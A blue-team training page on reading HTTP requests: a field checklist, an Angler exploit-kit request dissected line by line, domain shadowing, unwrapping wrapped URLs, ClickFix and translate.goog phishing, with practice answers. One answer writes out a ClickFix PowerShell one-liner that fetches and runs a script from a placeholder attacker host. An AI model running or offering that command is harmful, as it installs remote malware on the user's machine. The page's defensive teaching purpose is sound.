---
title: "Judging Requests — Checklist, Exploit Kits, URLs inside URLs"
tags:
  - training
  - blue-team
  - http
  - analysis
---

# Judging Requests — Checklist, Exploit Kits, URLs inside URLs { #reading-requests }

!!! abstract "What this page covers"
    A field-by-field checklist for HTTP requests (Host, User-Agent/Server, path, content, and the hard-to-judge Cookie), strings that look random but are normal, dissecting an exploit-kit (Angler) request line by line and domain shadowing, unwrapping URLs hidden inside a Referer (Google Translate, link-protection services), and what changed by 2026 (ClickFix, `translate.goog` phishing). Practice questions with answers are at the end.

!!! note "Labels"
    **[Added]** = practical must-know, **[Correction]** = fixes a commonly stated mistake, **[Changed]**/**[Caution]** = what changed recently and what is risky if done the old way. What each header means is on [POST, Other Methods and Request Headers](post-methods-headers.md#headers).

## Ten key points { #key-points }

1. Don't go on gut feel; ask the same questions in the same order: Host → User-Agent/Server → path → content.
2. Three words for suspicious: **long, random, needlessly encoded.** Legitimate software has nothing to hide.
3. The User-Agent question has three levels: known in the world → common in our network → right for **that PC** (check the asset inventory).
4. Cookies are supposed to look random. Judge their shape (named pairs, or one unnamed Base64 blob?) rather than their content.
5. Random is a reason to start investigating, not a verdict. Build hashes, signed cloud URLs and ad-tracking IDs are normal.
6. A request can be malicious even if most headers are normal; one or two decisive fields are enough. Check every field.
7. In a drive-by download the request comes from the victim's **legitimate browser**. A normal User-Agent doesn't mean safe.
8. User-Agent judgements depend on the era and your own baseline (IE10 was normal in 2015, suspicious in 2026).
9. "Old legitimate domain + never-seen random subdomain" → suspect domain shadowing or a hijacked registrar account.
10. If a URL contains a URL, **the inner one is the real destination**. Unwrap it even when the outside is Google or Microsoft.

## A field-by-field checklist { #checklist }

**Why it matters.** Newcomers to HTTP logs often get stuck at "something feels off but I can't say what". The fix is simple: ask **set questions, field by field, in a fixed order** — like airport security checking passport → boarding pass → bag → person every time. A fixed order means no field is skipped and you can explain your reasoning.

### ① Host — does the domain look safe? { #check-host }

Apply the [DNS domain signals](../dns/domain-signals.md): read right to left for the real owner, age, reputation, randomness, TLD.

```
Host: www.microsoft.com                       ← known, old, reputable
Host: q8z3k1vt.shady-host.eu                  ← random-looking subdomain, unfamiliar domain
Host: microsoft-365-verify.support-desk.top   ← brand name in front, real owner support-desk.top
```

- Line 1: normal
- Line 2: the subdomain looks machine-generated, not named by a person
- Line 3: brand name in front, but the real owner is `support-desk.top`; `.top` is cheap and frequently cited as heavily abused

### ② User-Agent (request) / Server (response) — is this the right software? { #check-software }

The request's User-Agent and the response's Server are both self-introductions of **the programs at either end of the conversation**, so they're checked together, in three levels:

| Level | Question | Baseline |
| --- | --- | --- |
| 1 | Do I recognise this software? | The world |
| 2 | Is it common on our network? | Our organisation |
| 3 | Do we run it, on the right OS and version? | **That PC** (asset inventory) |

`Chrome/141` passes levels 1 and 2, but if the sender is **a server without Chrome installed**, it fails level 3. The same goes for Server: if a company web server that always answers `Server: Microsoft-IIS/10.0` suddenly answers with something else, someone is in the middle or the server changed. Conversely, an external site saying `Server: nginx` proves nothing — attacker servers mostly run NGINX or Apache too.

### ③ Path — do folder/file names and parameters look suspicious? { #check-path }

```
/images/logo.png                                   ← normal
/PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE  ← long random string
/office365/secure/login/verify-account.php         ← phishing-style words
/wp-content/uploads/2026/10/invoice.pdf.exe        ← double extension, executable in uploads
/api/data?d=aG9zdD1hZG1pbi1QQzE=                   ← Base64 in a parameter
```

- Line 1: ordinary
- Line 2: a long random string no person would write
- Line 3: reassuring words (`office365`, `secure`, `login`, `verify`) piled up — a classic phishing path
- Line 4: an executable with a double extension in an uploads folder (meant for pictures); with extensions hidden, Windows shows it as `invoice.pdf`
- Line 5: Base64 in a parameter

### ④ Content — anything unusual, like unnecessary encoding? { #check-content }

Three words: **long, random, needlessly encoded.** Legitimate software sends data that people and programs can read easily; it's the attacker who has something to hide.

### The hard one: Cookie { #check-cookie }

Cookies are meant to look long and random, so the rule above doesn't apply directly. Judge the **shape** instead:

```
Cookie: session_id=8f3a91c2e7b44d0e; cart=2; lang=en      ← normal: named pairs
Cookie: aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=  ← one unnamed Base64 blob
```

Normal cookies are usually `name=value` pairs joined by `;`. A single unnamed Base64 blob, or a cookie that changes completely on every request to a never-seen domain, deserves a look — C2 frameworks (for example Cobalt Strike's default profile) put host details into cookies in exactly that shape.

### [Added] Things that look random but are normal { #random-but-normal }

Once you learn the checklist, every random string starts to look evil — the biggest source of false positives in practice.

```
/static/js/main.3f9a2b7c.js                                      ← build hash in file name
/bucket/report.pdf?X-Amz-Signature=9c1e0b...&X-Amz-Expires=3600  ← cloud storage signed URL
/landing?gclid=Cj0KCQjw...&utm_source=google                     ← ad click tracking IDs
/watch?v=dQw4w9WgXcQ                                             ← video ID
```

| Line | What it is |
| --- | --- |
| 1 | A fingerprint (build hash) added to file names on every site build, so browsers don't reuse stale copies |
| 2 | A cloud-storage URL signed to be valid for one hour |
| 3 | Ad-click tracking IDs |
| 4 | A video ID |

**Never judge on a random string alone** — combine it with domain reputation and age and the surrounding request flow.

## Dissecting an exploit-kit request: Angler { #exploit-kit }

### What an exploit kit is { #what-is-ek }

A **"browser-hacking vending machine"**. Just visiting a page lets it fingerprint the browser and plugins (back then Flash, Java, Silverlight and Internet Explorer itself), pick a matching exploit and install malware with no click (a drive-by download). Angler was the most notorious exploit kit of 2013–2016 and mainly spread ransomware.

```
1) User visits a legitimate but compromised site (or sees a malicious ad)
2) Hidden redirect/iframe sends the browser to the EK landing page
3) Landing page fingerprints the browser and plugins
4) Matching exploit is delivered (e.g. Flash, IE)
5) Payload (often ransomware) is downloaded and run
```

1. A normal site is compromised, or a malicious ad is served
2. A hidden redirect sends the browser to the exploit kit's landing page
3. The landing page inspects the browser
4. A matching exploit is delivered
5. The final payload (often ransomware) is installed

### Reading the request line by line { #ek-request }

A request in the shape commonly seen in Angler infection traffic (domains and paths replaced with examples). It's the request that moves on from the step-2 landing page.

```
GET /PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Referer: http://q8z3k1vt.shady-host.eu/38104p5h2c
Accept-Language: en-US
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
Accept-Encoding: gzip, deflate
Host: q8z3k1vt.shady-host.eu
Connection: Keep-Alive
```

| Field | Verdict | Explanation |
| --- | --- | --- |
| Request line (path) | **Suspicious** | 50+ random characters. Exploit kits generated fresh paths to defeat URL blocklists |
| `Accept` | Normal | "HTML preferred, but anything (`*/*`) is fine" — a typical IE value of the time |
| `Referer` | **Suspicious** | The previous page is another path on **the same suspicious domain** = the landing page; evidence the landing page called the next stage |
| `Accept-Language` | Normal | US English. Rarely security-relevant, but for an Australian organisation a value unlike the usual `en-AU` is a small hint |
| `User-Agent` | Normal (then) | IE10 (`MSIE 10.0`, `Trident/6.0`) on Windows 7 (`Windows NT 6.1`) — a common, legitimate browser in 2015 |
| `Accept-Encoding` | Normal | The response may be **compressed** with gzip/deflate. Carving a file from a capture by hand yields a compressed blob you must decompress (Wireshark's "Export Objects → HTTP" and similar tools usually do it for you) |
| `Host` | **Suspicious** | Random subdomain + unfamiliar domain |
| `Connection` | Normal | Performance header: reuse the same TCP connection |

**Rebuild the full URL:** Host + path.

```
http://q8z3k1vt.shady-host.eu/PVfXBbR9WReNMmbQzLqrbDvNmen2ConnpC4tVP6U4RFI4HnE
```

### Lessons from this request { #ek-lessons }

**1. Mostly normal headers can still be malicious.** Only Host, path and Referer are off; everything else is perfectly normal. That's why every field gets checked.

**2. A normal User-Agent doesn't mean safe.** In a drive-by download, the sender isn't malware but **the victim's legitimate browser**. And the same string in 2026 would be an impossible, obsolete browser. User-Agent judgements depend on the era and your baseline.

**3. Follow the Referer backwards.** The Referer of the landing-page request (`/38104p5h2c`) will most likely show **the compromised legitimate site** the user originally visited. That's where the infection started, and other staff who visited it are at risk too.

### [Added] Domain shadowing { #domain-shadowing }

Angler was known for **domain shadowing** (widely reported by Cisco Talos in 2015): attackers phished the registrar accounts of legitimate domain owners and silently created **thousands of random subdomains** pointing at their own servers.

- The parent domain is old, genuine and reputable → passes reputation checks
- The subdomains keep changing → hard to blocklist

So **"old legitimate domain + never-seen random subdomain"** is still worth checking. Use DNS logs and passive DNS to see when the subdomain first appeared and whether the domain ever had subdomains like it.

## URLs hidden inside a Referer { #url-in-url }

### A visit via Google Translate { #translate-referer }

This request looks odd at first. The user is viewing a Hungarian university site, the previous page was Google Translate, and **the site being viewed also appears inside** that Translate URL.

```
GET /some/page.html HTTP/1.1
Host: www.example-egyetem.hu
Referer: http://translate.google.com/translate?hl=en&sl=hu&u=http://www.example-egyetem.hu/some/page.html&prev=search
```

Did Google Translate send the user here? Was it compromised? Apply [URL anatomy](web-servers-urls-get.md#url) to the Referer and the answer appears:

```
http://translate.google.com/translate   ← Google Translate's whole-page translation feature
?hl=en                                   ← translate INTO English
&sl=hu                                   ← source language: Hungarian
&u=http://www.example-egyetem.hu/...     ← the page to translate
&prev=search                             ← user came from a search result
```

**What actually happened:** the user pasted the Hungarian site into Google Translate's whole-page translation to read it in English. The Translate page opened and re-requested the original site's resources (images, scripts), so the Referer shows the Translate URL. No compromise, no odd redirect — just a roundabout chain of events.

### "URLs inside URLs" you see every day { #wrapped-urls }

Analysts must recognise when **the inner URL, not the outer one, is the real destination**.

```
https://www.google.com/url?q=https%3A%2F%2Fexample.org%2Fpage&sa=D
https://aus01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Flogin&data=...
https://urldefense.com/v3/__https://evil.example/login__;!!...
```

| Service | Where the real destination is |
| --- | --- |
| Google redirect (search results, Google Docs links) | After `q=` (`%3A` = `:`, `%2F` = `/`) |
| Microsoft 365 Safe Links (wraps email links, checks at click time) | After `url=` |
| Proofpoint URL Defense | Between `__` and `__` |

During phishing investigations proxy logs are full of these. **Don't wave them through because the outer domain is google, outlook or urldefense — unwrap the inner address.**

## 2026 perspective { #trends }

!!! success "[Still valid in 2026]"
    The field-by-field checklist and "long, random, needlessly encoded" remain the best basic habits. "Unwrap URLs inside URLs" matters even more now that link-protection services are everywhere.

!!! info "[Changed]"
    - **The exploit-kit era is effectively over.** Angler vanished abruptly in June 2016 (widely linked to the arrests of the Russian Lurk group), and with Flash's end of support (end of 2020), Internet Explorer's retirement (2022), auto-updating browsers and stronger sandboxes, "infected just by visiting" became very hard. Attackers switched from **attacking the browser to fooling the person**:
        - **Fake updates and fake installers:** "your browser needs updating" pop-ups on compromised sites (SocGholish-style), fake installers pushed via search ads and SEO poisoning
        - **ClickFix (fake CAPTCHA / fake fix):** surging since 2024. The page says "to prove you're human, press Win+R → Ctrl+V → Enter" after silently copying a malicious PowerShell command to the clipboard. The user runs it themselves — no browser exploit needed
        - **Traffic distribution systems (TDS) and cloaking:** checking whether the visitor is a security scanner or a real victim in the target country/device and showing the malicious page only to victims — descendants of the exploit-kit "gate"
    - So HTTP analysis increasingly means spotting **"a non-browser program (PowerShell, mshta, curl) fetched something from the web"** rather than "the browser requested an odd path". The [User-Agent question](#check-software) is central again.
    - **Long URLs in Referer are rarer.** The default browser policy (strict-origin-when-cross-origin) sends only the origin, such as `https://translate.google.com/`, to other sites. Google Translate itself now serves translated pages from a **dedicated proxy domain** such as `www-example-egyetem-hu.translate.goog`. Rule: dots become hyphens, existing hyphens become double hyphens, then `.translate.goog` is appended.

!!! warning "[Caution] Wrong or risky if done the old way"
    - **Translation and link-protection services are also phishing wrappers.** Several security vendors have reported phishing pages wrapped in `*.translate.goog`. With Google on the outside, filters and users relax. The same goes for Safe Links-wrapped links. Always unwrap and judge **the real inner destination**.
    - **"Random = malicious" breeds false positives.** Normal random strings (build hashes, signed cloud URLs, ad-tracking IDs) keep multiplying. Random is a reason to investigate, not a verdict.

## Practice questions { #quiz }

Answer first, then expand the explanation.

### Question 1

A staff PC logged this request. Within the previous minute, the same PC visited `captcha-verify-cdn.example` in its browser.

```
GET /c/run.txt HTTP/1.1
Host: captcha-verify-cdn.example
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-AU) WindowsPowerShell/5.1.26100.2161
```

(a) Which program sent it? (b) Which checklist field fails most decisively, and why? (c) What attack is suspected, and what should you check on the host?

??? success "Answer and explanation"
    **(a) Windows PowerShell 5.1.** This is the default User-Agent of PowerShell's web cmdlets (`Invoke-WebRequest`, `Invoke-RestMethod`, aka `iwr`, `irm`). `Windows NT 10.0` = Windows 10/11, `en-AU` = the PC's locale, `5.1.26100.2161` = PowerShell version (build `26100` is Windows 11 24H2). A locale matching the real PC also suggests **genuine PowerShell ran on that PC**, not a faked string.

    **(b) User-Agent.** It fails "do we run this software for this purpose?" squarely: PowerShell on an ordinary office PC fetching files straight from an external site is rare. Two more clues stack up:

    - PowerShell contacted **the very site** the browser visited a minute earlier → a strong sign the web page got the user to run something
    - `/c/run.txt` — harmless-looking `.txt`, but a `.txt` fetched by PowerShell is usually **the next-stage script**. The domain name `captcha-verify-cdn` mimics a CAPTCHA check too

    **(c) ClickFix (fake CAPTCHA).** When the user presses Win+R → Ctrl+V → Enter, a command the page silently copied runs, for example:

    ```
    powershell -w hidden -c "irm https://captcha-verify-cdn.example/c/run.txt | iex"
    ```

    `-w hidden` = hide the window, `irm ...` = fetch text from the URL (this request), `| iex` (Invoke-Expression) = **run the fetched text as a command**.

    Check on the host:

    1. **Sysmon Event ID 1 / Event 4688** — parent **`explorer.exe`** → child **`powershell.exe`** (Explorer launches Run-dialog commands). Look for `irm`, `iwr`, `iex`, `-w hidden`, `-enc` (Base64-encoded command) in the command line
    2. **RunMRU registry** — `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` remembers commands typed into the Run dialog, most recent first. The pasted command stays there — **a signature ClickFix artefact**
    3. **PowerShell Script Block Logging (Event 4104)** — `Microsoft-Windows-PowerShell/Operational` records the script actually executed, often in de-obfuscated form, showing best what `run.txt` did. Which is why attackers sometimes try to switch it off
    4. **Sysmon Event ID 3 (network connection) / 11 (file create)** — where else `powershell.exe` connected and what it dropped
    5. **Proxy logs** — the PC's subsequent requests in time order

    **Response:** isolate the PC. ClickFix commonly delivers infostealers (e.g. Lumma), so assume saved passwords and **login cookies** are gone: reset passwords and revoke all sessions. A stolen cookie bypasses MFA ([Cookie](post-methods-headers.md#cookie)).

### Question 2

A proxy log shows requests to this Host:

```
Host: secure--login-micros0ft-com.translate.goog
```

(a) What is the real origin site Google Translate is wrapping? (b) Why would an attacker route victims through Google Translate, and what's suspicious about the origin domain itself?

??? success "Answer and explanation"
    **(a) `secure-login.micros0ft.com`.** Drop `.translate.goog` and reverse the rule — **double hyphens first**:

    ```
    secure--login-micros0ft-com
    secure[-]login-micros0ft-com   ← "--" back to "-" first
    secure-login.micros0ft.com     ← then single "-" back to "."
    ```

    **(b) Why route through Google Translate:**

    1. **The outer domain belongs to Google** → easier past email filters, URL reputation checks and users' eyes; the certificate is a genuine Google one
    2. The victim organisation's proxy logs only show `translate.goog` → **miss the real destination unless you unwrap it**
    3. Google's servers fetch the content from the origin → the phishing server sees Google's IPs, not the victims', so even if the attacker's server is examined the victims stay hidden

    **What's wrong with the origin domain:** reading right to left, the real owner is `micros0ft.com` — **digit `0`** instead of the letter `o`, a typosquatting domain. `secure-login` in front is a reassuring subdomain.

    **SOC response:** unwrap `*.translate.goog` Hosts to the origin and evaluate that; alert separately when brand names (microsoft, office, outlook, mygov, bank names) appear. Block **the unwrapped origin domain**, not `translate.goog` as a whole.

### Question 3

Split these four URLs into "looks random but probably normal" and "needs investigating", with reasons.

```
A: https://shop.example.com/assets/app.9f3c21ab.js
B: http://x7qk2m9vtl.old-bakery-shop.com.au/Hn3kQz8LmPwR4tYvB2cXe9sJ0aFgD6uK
C: https://my-bucket.s3.ap-southeast-2.amazonaws.com/q3-report.pdf?X-Amz-Expires=3600&X-Amz-Signature=4b1f9e...
D: https://news.example.org/article?id=812&utm_source=newsletter&fbclid=IwAR2x...
```

??? success "Answer and explanation"
    **Probably normal: A, C, D. Investigate: B.**

    | URL | Verdict | Reason |
    | --- | --- | --- |
    | A | Normal | A JS file served from the shop's **own domain**; `9f3c21ab` is a build hash. The random part is short and sits between readable names (`assets`, `app`) |
    | C | Probably normal (not automatically safe) | `X-Amz-Expires=3600` = valid one hour, `X-Amz-Signature` = AWS signature — a common legitimate structure. But anyone can open an S3 account, so attackers send these links too → if a phishing email delivers a file from a never-seen bucket, **check the file itself** ("reputation borrowing") |
    | D | Normal | `utm_source` = marketing tag, `fbclid` = Facebook click ID |
    | B | **Investigate** | See below |

    **Why B is suspicious:**

    1. `http`, not `https` — legitimate sites in 2026 are almost all HTTPS
    2. The parent looks like an old small-business (bakery) domain, yet a bakery has no reason to use a random subdomain like `x7qk2m9vtl` → **"old legitimate domain + never-seen random subdomain"** = [domain shadowing](#domain-shadowing) shape or a hijacked registrar account
    3. A 32-character random path — the same shape as the [Angler path](#ek-request)

    **How to investigate:** DNS logs / passive DNS for **when the subdomain first appeared** and whether the bakery domain ever had subdomains like it → follow the visiting PC's Referer backwards to see where it came from (another compromised site, an email, an ad) → what the PC fetched afterwards → other staff who visited the same address.

    **Common thread:** unwrap the real identity rather than the surface — the real actor behind the User-Agent (Q1), the real destination inside the wrapper (Q2), context rather than randomness (Q3).
